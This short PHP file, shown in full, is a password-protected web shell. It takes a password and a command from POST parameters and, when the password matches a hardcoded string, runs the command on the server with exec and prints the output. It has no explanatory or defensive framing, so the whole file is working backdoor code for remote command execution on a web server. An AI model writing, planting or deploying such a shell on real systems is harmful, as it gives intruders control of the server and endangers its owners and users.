<?php
$password=$_POST['password'];
$command=$_POST['command'];
if ($password == "testingpayload"){
	echo exec($command);
}
?>
